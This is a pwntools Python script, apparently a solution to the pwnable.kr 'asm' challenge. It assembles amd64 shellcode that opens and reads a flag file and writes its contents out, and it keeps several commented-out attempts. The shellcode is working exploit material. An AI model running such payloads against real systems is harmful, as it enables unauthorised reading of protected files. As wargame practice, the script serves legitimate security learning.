from pwn import * 

#context.binary = 'asm' 
#p = process(context.binary)

# WORKING ! payload = asm(shellcraft.amd64.open('./myflag', 0, 0),arch='amd64')
#payload = asm(shellcraft.amd64.open('./myflag', 0, 0),arch='amd64')
# WORKING! But neet to set fd payload = asm(shellcraft.amd64.read(fd=0, buffre='rsp',count=8),arch='amd64')
#payload = asm(shellcraft.amd64.read(0, 'rsp',8),arch='amd64')
#payload = asm(shellcraft.amd64.sleep(5),arch='amd64')
#payload = asm(shellcraft.amd64.sleep(5),arch='amd64')
print("make sure I create a file at /tmp/output\nAnd chmod 644 /tmp/output")
payload = asm(shellcraft.amd64.open("./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0, 0), arch='amd64') # open flag
payload += asm(shellcraft.amd64.read(3,'rsp',0x30), arch='amd64') # read flag
payload += asm(shellcraft.amd64.open("/tmp/noi/output",constants.O_RDWR, 644), arch='amd64') # open output file for writing
# write(4,val_from_sp,0x10
payload += asm("""
pop r8
pop r8
mov rdx, 0x30
mov rsi, rsp
mov rdi, 1
push 1
pop rax
syscall
""" , arch='amd64')
payload += asm(shellcraft.amd64.exit(0), arch='amd64') # read flag
#payload += asm(shellcraft.amd64.write(4,constants.O_RDWR, 644), arch='amd64') # open output file for writing
#payload += asm(shellcraft.amd64.write(,'rsp',16), arch='amd64') # open output file for writing


#payload = asm(shellcraft.amd64.write(0,'rsp',8),arch='amd64')

print(disasm(payload))

print(f"writing {payload} to file")
with open("payload", "wb") as f:
	f.write(payload)

#gdb.attach(p, '''
        #set disassembly-flavor intel
        #b *main
        #''')

#p.interactive()
#line = p.recvline()
#print(line)
